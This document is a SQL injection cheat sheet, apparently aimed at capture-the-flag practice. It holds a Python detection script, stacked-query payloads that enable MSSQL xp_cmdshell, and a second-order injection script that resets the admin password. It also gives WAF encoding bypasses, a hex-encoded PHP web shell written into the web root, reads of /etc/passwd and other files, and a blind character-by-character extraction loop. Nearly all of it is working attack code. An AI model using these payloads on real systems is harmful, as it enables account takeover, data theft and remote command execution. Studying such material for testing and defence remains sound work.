---

## Automated SQLi Detection Script

```python
#!/usr/bin/env python3
"""Automated SQL injection detection across multiple database engines."""
import requests
import sys
import time
import urllib.parse

def test_sqli(url, param, method="GET", data=None, cookies=None):
    """Test a parameter for SQL injection across MySQL/PostgreSQL/SQLite/MSSQL."""
    results = []
    headers = {"User-Agent": "Mozilla/5.0"}

    # Error-based payloads (detect via error messages)
    error_payloads = [
        ("Single quote", "'", ["SQL syntax", "mysql", "PostgreSQL", "sqlite", "OLE DB", "ODBC", "unclosed quotation"]),
        ("Double quote", '"', ["SQL syntax", "mysql", "PostgreSQL", "sqlite", "OLE DB"]),
        ("Parenthesis", "')", ["SQL syntax", "unmatched", "near"]),
    ]

    # Boolean-based payloads (detect via response difference)
    boolean_payloads = [
        ("OR true", "' OR '1'='1", "' OR '1'='2"),
        ("OR true (double)", '" OR "1"="1', '" OR "1"="2'),
        ("AND true", "' AND '1'='1'--", "' AND '1'='2'--"),
    ]

    # Time-based payloads (detect via response delay)
    time_payloads = [
        ("MySQL SLEEP", "' OR SLEEP(5)--", 5),
        ("PostgreSQL pg_sleep", "'; SELECT pg_sleep(5)--", 5),
        ("MSSQL WAITFOR", "'; WAITFOR DELAY '0:0:5'--", 5),
        ("SQLite randomblob", "' OR 1=randomblob(500000000)--", 3),
    ]

    # UNION-based detection
    union_payloads = [
        ("UNION NULL x1", "' UNION SELECT NULL--"),
        ("UNION NULL x2", "' UNION SELECT NULL,NULL--"),
        ("UNION NULL x3", "' UNION SELECT NULL,NULL,NULL--"),
        ("UNION NULL x4", "' UNION SELECT NULL,NULL,NULL,NULL--"),
        ("UNION NULL x5", "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"),
    ]

    baseline = _send(url, param, "normalvalue", method, data, cookies, headers)

    # Error-based tests
    for name, payload, indicators in error_payloads:
        resp = _send(url, param, payload, method, data, cookies, headers)
        if resp and any(ind.lower() in resp.text.lower() for ind in indicators):
            results.append(f"[ERROR-BASED] {name}: Triggered SQL error")

    # Boolean-based tests
    for name, true_payload, false_payload in boolean_payloads:
        resp_true = _send(url, param, true_payload, method, data, cookies, headers)
        resp_false = _send(url, param, false_payload, method, data, cookies, headers)
        if resp_true and resp_false and len(resp_true.text) != len(resp_false.text):
            results.append(f"[BOOLEAN] {name}: Response length differs (true={len(resp_true.text)}, false={len(resp_false.text)})")

    # Time-based tests
    for name, payload, delay in time_payloads:
        start = time.time()
        _send(url, param, payload, method, data, cookies, headers)
        elapsed = time.time() - start
        if elapsed >= delay - 1:
            results.append(f"[TIME-BASED] {name}: Response delayed {elapsed:.1f}s (expected {delay}s)")

    return results

def _send(url, param, value, method, data, cookies, headers):
    """Send request with injected parameter."""
    try:
        if method.upper() == "GET":
            return requests.get(f"{url}?{param}={urllib.parse.quote(value)}",
                              headers=headers, cookies=cookies, timeout=15, allow_redirects=False)
        else:
            post_data = dict(data) if data else {}
            post_data[param] = value
            return requests.post(url, data=post_data, headers=headers,
                               cookies=cookies, timeout=15, allow_redirects=False)
    except requests.Timeout:
        return None
    except Exception:
        return None

if __name__ == "__main__":
    target = sys.argv[1]  # e.g., http://target.com/search
    param = sys.argv[2]   # e.g., q
    print(f"[*] Testing {target} parameter '{param}'")
    findings = test_sqli(target, param)
    for f in findings:
        print(f"  [+] {f}")
    if not findings:
        print("  [-] No SQL injection detected")
```

---

## Stacked Queries

Stacked queries allow executing multiple SQL statements in one injection. Not all databases/drivers support them.

### MySQL
```sql
'; INSERT INTO users VALUES('hacker','hacked')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
'; CREATE TABLE exfil AS SELECT * FROM users--
```

### PostgreSQL
```sql
'; CREATE TABLE exfil(data text); COPY exfil FROM '/etc/passwd'--
'; SELECT pg_sleep(5)--
'; DROP TABLE IF EXISTS exfil; CREATE TABLE exfil AS SELECT * FROM users--
```

### MSSQL
```sql
'; EXEC xp_cmdshell('whoami')--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
'; EXEC xp_cmdshell('type C:\inetpub\wwwroot\web.config')--
```

**Detection tip:** If time-based works but UNION doesn't, stacked queries may be the path to data extraction.

---

## Second-Order Injection

Payload is stored first, then triggered when used in a different query.

### Pattern: Register → Trigger via Password Change
```
1. Register user with username: admin'--
2. Login as admin'--
3. Change password → backend runs:
   UPDATE users SET password='newpass' WHERE username='admin'--'
   → Actually updates admin's password!
```

### Testing Script
```python
import requests

target = "http://target.com"
s = requests.Session()

# Step 1: Register with payload username
s.post(f"{target}/register", data={
    "username": "admin'--",
    "password": "test123",
    "email": "test@test.com"
})

# Step 2: Login as payload user
s.post(f"{target}/login", data={
    "username": "admin'--",
    "password": "test123"
})

# Step 3: Change password (triggers second-order SQLi)
s.post(f"{target}/change-password", data={
    "current_password": "test123",
    "new_password": "pwned123"
})

# Step 4: Login as admin with new password
r = s.post(f"{target}/login", data={
    "username": "admin",
    "password": "pwned123"
})
print("[+] Admin login:", "success" if r.status_code == 200 else "failed")
```

---

## Encoding Bypasses

When WAFs or filters block standard SQL injection payloads.

### URL Encoding
```
' → %27
" → %22
# → %23
-- → %2D%2D
UNION → %55%4E%49%4F%4E
SELECT → %53%45%4C%45%43%54
```

### Double URL Encoding
```
' → %2527
" → %2522
```

### Unicode/UTF-8 Encoding
```
' → %C0%A7 or %EF%BC%87 (fullwidth apostrophe)
" → %EF%BC%82
< → %EF%BC%9C
```

### Hex Encoding (MySQL)
```sql
-- Instead of string literals:
SELECT * FROM users WHERE username=0x61646D696E  -- 'admin' in hex
UNION SELECT 0x3C3F706870206563686F2073797374656D28245F4745545B27636D64275D293B3F3E INTO OUTFILE '/var/www/shell.php'
```

### Case Variation
```sql
uNiOn SeLeCt
UnIoN/**/sElEcT
UN/**/ION SE/**/LECT
```

### Comment Injection (bypass keyword filters)
```sql
UN/**/ION/**/SEL/**/ECT
/*!50000UNION*//*!50000SELECT*/
```

---

## Polyglot Payloads

Single payloads that work across multiple database engines.

```sql
-- Works on MySQL, PostgreSQL, MSSQL:
' OR 1=1--
" OR ""="
' OR ''='

-- Cross-engine UNION (adjustable columns):
' UNION SELECT NULL,NULL,NULL--

-- Cross-engine time delay detection:
'||(SELECT CASE WHEN 1=1 THEN (SELECT 1 FROM (SELECT SLEEP(5))x) ELSE 1 END)||'

-- Filter bypass polyglot:
'/**/OR/**/1=1/**/--/**/
```

---

## Sensitive File Extraction

### MySQL — Read Files
```sql
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--
' UNION SELECT LOAD_FILE('/flag.txt'),NULL--
' UNION SELECT LOAD_FILE('/app/flag'),NULL--
' UNION SELECT LOAD_FILE('/etc/flag'),NULL--
' UNION SELECT LOAD_FILE(0x2F666C6167),NULL--  -- /flag in hex
```

### PostgreSQL — Read Files
```sql
'; CREATE TABLE tmp(data text); COPY tmp FROM '/flag'; SELECT data FROM tmp--
' UNION SELECT pg_read_file('/flag'),NULL--
' UNION SELECT pg_read_file('/flag.txt'),NULL--
' UNION SELECT pg_read_file('/app/flag'),NULL--
```

### SQLite — Enumerate Tables and Extract Data
```sql
' UNION SELECT sql,NULL FROM sqlite_master--
' UNION SELECT group_concat(name),NULL FROM sqlite_master WHERE type='table'--
' UNION SELECT group_concat(sql),NULL FROM sqlite_master--
-- Then read from discovered tables:
' UNION SELECT flag,NULL FROM flags--
' UNION SELECT flag,NULL FROM secret--
```

### Blind Flag Extraction (character by character)
```python
import requests
import string

flag = ""
for i in range(1, 100):
    found = False
    for c in string.printable:
        # MySQL
        payload = f"' AND (SELECT SUBSTRING(flag,{i},1) FROM flags)='{c}'--"
        # PostgreSQL
        # payload = f"' AND (SELECT SUBSTRING(flag,{i},1) FROM flags)='{c}'--"
        r = requests.get(f"http://target.com/search?q={payload}")
        if "success_indicator" in r.text:
            flag += c
            print(f"Flag so far: {flag}")
            found = True
            break
    if not found:
        break
print(f"Final flag: {flag}")
```

### Common Flag Locations
```
/flag, /flag.txt, /app/flag, /app/flag.txt
/home/*/flag.txt, /tmp/flag, /etc/flag
Database tables: flags, secret, flag, ctf
Database columns: flag, secret, value, data
```
